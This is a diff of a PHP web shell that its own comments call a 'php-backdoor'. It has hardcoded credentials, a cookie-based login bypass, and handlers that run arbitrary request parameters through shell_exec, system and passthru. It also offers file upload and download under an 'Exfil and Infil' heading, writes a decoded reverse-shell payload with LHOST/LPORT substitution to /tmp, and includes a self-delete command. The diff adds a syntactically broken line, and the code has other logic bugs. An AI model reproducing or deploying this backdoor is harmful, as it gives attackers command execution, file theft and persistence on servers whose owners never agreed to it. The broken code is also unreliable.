@@ -3,206 +3,219 @@
 // At some point it helps if you like silly names in the early 2000s
 // The reinvented wheel made with love and ChatGpt to
 // php-backdoor can upload and download stuff!
-$auth = 1;
+//
+// Perspective-Honed-Persistence: MWIwNzI3N2QxZTM1MjVkYWI3M2JiMzA4NzcwOWFhZWY6NDBhNjNjNDQ0NWRlNzVkOTY2YmQ5NDk0MGI1ZmJjNDcK
 ob_implicit_flush();
 error_reporting(0);
-$name = "1b07277d1e3525dab73bb3087709aaef"; //login = 'badadmin'
+ini_set("display_errors", 0);
+$phpVersion = phpversion();
+$user = "1b07277d1e3525dab73bb3087709aaef"; //login = 'badadmin'
 $pass = "40a63c4445de75d966bd94940b5fbc47"; //pass  = 'personalhomepagewebshell'
 $headers = getallheaders();
-$unlockHeader = "Persistence-Honed-Perspective";
-if ($auth == 1) {
-    if (
-        !isset($HTTP_SERVER_VARS["PHP_AUTH_USER"]) &&
-        md5($HTTP_SERVER_VARS["PHP_AUTH_USER"]) != $name &&
-        md5($HTTP_SERVER_VARS["PHP_AUTH_PW"]) != $pass &&
-        !isset($headers[$unlockHeader])
-    ) {
-        $auth = 0;
+if (version_compare($phpVersion, "5.0.0", "<")) {
+    if (isset($HTTP_COOKIE_VARS["Perspective-Honed-Persistence"])) {
+        $cookieValue = base64_decode($_COOKIE["Perspective-Honed-Persistence"]);
+        $cookie_parts = explode(":", $cookieValue, 2);
+
+        if (count($cookie_parts) == 2) {
+            $cookie_user = $cookie_parts[0];
+            $cookie_pass = $cookie_parts[1];
+        }
+    } else {
+        if (isset($_COOKIE["Perspective-Honed-Persistence"])) {
+            $cookieValue = base64_decode(
+                $_COOKIE["Perspective-Honed-Persistence"]
+            );
+            list($cookie_user, $cookie_pass) = explode(":", $cookieValue, 2);
+        }
+    }
+
+    if (md5($cookie_user) != $user && md5($cookie_pass) != $pass) {
+        error_reporting(0);
+        ini_set("display_errors", 0);
         header("HTTP/1.0 403 Unauthorized");
         exit("Access Denied");
     }
 } else {
+    error_reporting(0);
     echo '<form action="' . $_SERVER["PHP_SELF"] . '" method="GET">';
     echo 'Execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr>';
     echo "</form>";
     echo "Commands:";
-    echo "	kill : Will delete this file";
+    echo "      kill : Will delete this file";
     echo "Tests: ";
-    echo "	testcmds : tests shell_exec, system, passthru, eval with \`whoami\`  ";
-    echo "	testDevShm : check permissions of /dev/shm";
-    echo "	testperl : prints the help for perl";
-    echo "	testgcc : prints the help for gcc";
-    echo "	testpython : prints the help for python3";
-    echo "	testwget : prints the help for wget";
-    echo "	testcurl : prints the help for curl";
+    echo "      testcmds : tests shell_exec, system, passthru, eval with \`whoami\`  ";
+    echo "      testDevShm : check permissions of /dev/shm";
+    echo "      testperl : prints the help for perl";
+    echo "      testgcc : prints the help for gcc";
+    echo "      testpython : prints the help for python3";
+    echo "      testwget : prints the help for wget";
+    echo "      testcurl : prints the help for curl";
     echo "Command execution - ?<listed handled>=Your command goes here";
-    echo "	shell_exec";
-    echo "	system";
-    echo "	passthru";
-    echo "	eval";
+    echo "      shell_exec";
+    echo "      system";
+    echo "      passthru";
+    echo "      eval";
     echo "Exfil and Infil:";
     echo " upload : ";
     echo " download : ";
-}
 
-if (isset($_REQUEST["shell_exec"])) {
-    echo "<pre>";
-    $shell_exec = $_REQUEST["shell_exec"];
-    shell_exec($shell_exec);
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["system"])) {
-    echo "<pre>";
-    $system = $_REQUEST["system"];
-    system($system);
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["passthru"])) {
-    echo "<pre>";
-    $passthru = $_REQUEST["passthru"];
-    passthru($passthru);
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["eval"])) {
-    echo "<pre>";
-    $eval = $_REQUEST["eval"];
-    passthru($eval);
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["testcmds"])) {
-    echo "<pre>";
-    $test = testcmds();
-    echo "$test";
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["testDevShm"])) {
-    echo "<pre>";
-    $test = testDevShm();
-    echo "$test";
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["testperl"])) {
-    echo "<pre>";
-    $test = testperl();
-    echo "$test";
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["testgcc"])) {
-    echo "<pre>";
-    $test = testgcc();
-    echo "$test";
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["testpython"])) {
-    echo "<pre>";
-    $testpython = testpython();
-    echo "$test";
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["testwget"])) {
-    echo "<pre>";
-    $test = testwget();
-    echo "$test";
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["testcurl"])) {
-    echo "<pre>";
-    $test = testcurl();
-    echo "$test";
-    echo "</pre>";
-    die();
-}
-
-if (isset($_REQUEST["testGetMicrotime"])) {
-    executeAndDisplay("getmicrotime");
-}
-
-if (isset($_REQUEST["testGetFilePermissions"])) {
-    $path = $_REQUEST["testGetFilePermissionsPath"]; // Adjust the key accordingly
-    executeAndDisplay("getFilePermissions", [$path]);
-}
-
-if (isset($_REQUEST["testGetSystem"])) {
-    executeAndDisplay("getsystem");
-}
-
-if (isset($_REQUEST["testGetServer"])) {
-    executeAndDisplay("getserver");
-}
-
-if (isset($_REQUEST["testGetUser"])) {
-    executeAndDisplay("getuser");
-}
-
-if (isset($_REQUEST["upload"])) {
-    error_reporting(1);
-    if (!isset($_REQUEST["dir"])) {
-        die("Specify a directory!?!");
+    if (isset($_REQUEST["shell_exec"])) {
+        echo "<pre>";
+        $shell_exec = $_REQUEST["shell_exec"];
+        shell_exec($shell_exec);
+        echo "</pre>";
+        die();
     }
-} else {
-    $dir = $_REQUEST["dir"];
-    $fname = $HTTP_POST_FILES["file_name"]["name"];
-    if (
-        !move_uploaded_file(
-            $HTTP_POST_FILES["file_name"]["tmp_name"],
-            $dir . $fname
-        )
-    ) {
-        die("File uploading error.");
-    }
-    error_reporting(0);
-    die();
-}
 
-if (isset($_REQUEST["download"])) {
-    $dir = isset($_REQUEST["dir"]) ? $_REQUEST["dir"] : "";
-    if (!empty($dir)) {
-        $filename = isset($_REQUEST["file_name"]) ? $_REQUEST["file_name"] : "";
-        if (file_exists($dir . $filename)) {
-            header("Content-Description: File Transfer");
-            header("Content-Type: application/octet-stream");
-            header(
-                'Content-Disposition: attachment; filename="' .
-                    basename($filename) .
-                    '"'
-            );
-            header("Expires: 0");
-            header("Cache-Control: must-revalidate");
-            header("Pragma: public");
-            header("Content-Length: " . filesize($dir . $filename));
-            readfile($dir . $filename);
-            exit();
-        } else {
-            die("File does not exist.");
+    if (isset($_REQUEST["system"])) {
+        echo "<pre>";
+        $system = $_REQUEST["system"];
+        system($system);
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["passthru"])) {
+        echo "<pre>";
+        $passthru = $_REQUEST["passthru"];
+        passthru($passthru);
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["eval"])) {
+        echo "<pre>";
+        $eval = $_REQUEST["eval"];
+        passthru($eval);
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["testcmds"])) {
+        echo "<pre>";
+        $test = testcmds();
+        echo "$test";
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["testDevShm"])) {
+        echo "<pre>";
+        $test = testDevShm();
+        echo "$test";
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["testperl"])) {
+        echo "<pre>";
+        $test = testperl();
+        echo "$test";
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["testgcc"])) {
+        echo "<pre>";
+        $test = testgcc();
+        echo "$test";
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["testpython"])) {
+        echo "<pre>";
+        $testpython = testpython();
+        echo "$test";
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["testwget"])) {
+        echo "<pre>";
+        $test = testwget();
+        echo "$test";
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["testcurl"])) {
+        echo "<pre>";
+        $test = testcurl();
+        echo "$test";
+        echo "</pre>";
+        die();
+    }
+
+    if (isset($_REQUEST["testGetMicrotime"])) {
+        executeAndDisplay("getmicrotime");
+    }
+
+    if (isset($_REQUEST["testGetSystem"])) {
+        executeAndDisplay("getsystem");
+    }
+
+    if (isset($_REQUEST["testGetServer"])) {
+        executeAndDisplay("getserver");
+    }
+
+    if (isset($_REQUEST["testGetUser"])) {
+        executeAndDisplay("getuser");
+    }
+
+    if (isset($_REQUEST["upload"])) {
+        error_reporting(1);
+        if (!isset($_REQUEST["dir"])) {
+            die("Specify a directory!?!");
         }
     } else {
-        die("Specify a directory.");
+        $dir = $_REQUEST["dir"];
+        $fname = $HTTP_POST_FILES["file_name"]["name"];
+        if (
+            !move_uploaded_file(
+                $HTTP_POST_FILES["file_name"]["tmp_name"],
+                $dir . $fname
+            )
+        ) {
+            die("File uploading error.");
+        }
+        error_reporting(0);
+        die();
     }
-}
 
-if ($_GET["kill"] == "yes") {
-    unlink($_SERVER["SCRIPT_FILENAME"]);
-    echo "<script>alert('Your shell script was successfully deleted!')</script>";
+    if (isset($_REQUEST["download"])) {
+        $dir = isset($_REQUEST["dir"]) ? $_REQUEST["dir"] : "";
+        if (!empty($dir)) {
+            $filename = isset($_REQUEST["file_name"])
+                ? $_REQUEST["file_name"]
+                : "";
+            if (file_exists($dir . $filename)) {
+                header("Content-Description: File Transfer");
+                header("Content-Type: application/octet-stream");
+                header(
+                    'Content-Disposition: attachment; filename="' .
+                        basename($filename) .
+                        '"'
+                );
+                header("Expires: 0");
+                header("Cache-Control: must-revalidate");
+                header("Pragma: public");
+                header("Content-Length: " . filesize($dir . $filename));
+                readfile($dir . $filename);
+                exit();
+            } else {
+                die("File does not exist.");
+            }
+        } else {
+            die("Specify a directory.");
+        }
+    }
+
+    if ($_GET["kill"] == "yes") {
+        unlink($_SERVER["SCRIPT_FILENAME"]);
+        echo "<script>alert('Your shell script was successfully deleted!')</script>";
+    }
 }
 
 function getmicrotime()
@@ -211,63 +224,6 @@ function getmicrotime()
     return (float) $usec + (float) $sec;
 }
 
-function getFilePermissions($path)
-{
-    $perms = fileperms($path);
-
-    $permissions = [];
-
-    $permissions[] = (((((($perms & 0xc000
-                                ? "s"
-                                : $perms & 0xa000)
-                            ? "l"
-                            : $perms & 0x8000)
-                        ? "-"
-                        : $perms & 0x6000)
-                    ? "b"
-                    : $perms & 0x4000)
-                ? "d"
-                : $perms & 0x2000)
-            ? "c"
-            : $perms & 0x1000)
-        ? "p"
-        : "u";
-
-    $permissions[] = $perms & 0x0100 ? "r" : "-";
-    $permissions[] = $perms & 0x0080 ? "w" : "-";
-    $permissions[] =
-        $perms & 0x0040
-            ? ($perms & 0x0800
-                ? "s"
-                : "x")
-            : ($perms & 0x0800
-                ? "S"
-                : "-");
-
-    $permissions[] = $perms & 0x0020 ? "r" : "-";
-    $permissions[] = $perms & 0x0010 ? "w" : "-";
-    $permissions[] =
-        $perms & 0x0008
-            ? ($perms & 0x0400
-                ? "s"
-                : "x")
-            : ($perms & 0x0400
-                ? "S"
-                : "-");
-
-    $permissions[] = $perms & 0x0004 ? "r" : "-";
-    $permissions[] = $perms & 0x0002 ? "w" : "-";
-    $permissions[] =
-        $perms & 0x0001
-            ? ($perms & 0x0200
-                ? "t"
-                : "x")
-            : ($perms & 0x0200
-                ? "T"
-                : "-");
-
-    return $permissions;
-}
 function getsystem()
 {
     return php_uname("s") . " " . php_uname("r") . " " . php_uname("v");
@@ -412,6 +368,8 @@ JGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cj8+IAoKCgo=";
         fputs($i = fopen("/tmp/shlbck.php", "w"), base64_decode($php));
         fclose($i);
         $buffer = "";
+        if $patterns = array("/LHOST/" => $ip,"/LPORT/" => $port);
+	
         $patterns = [
             "/LHOST/" => $ip,
             "/LPORT/" => $port,
@@ -538,9 +496,9 @@ function testcurl()
     }
 }
 
-
 // use: https://www.gaijin.at/en/tools/php-obfuscator
 ?>
+
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -576,3 +534,4 @@ function testcurl()
     <p>Return to <a href="/">Homepage</a></p>
 </body>
 </html>
+
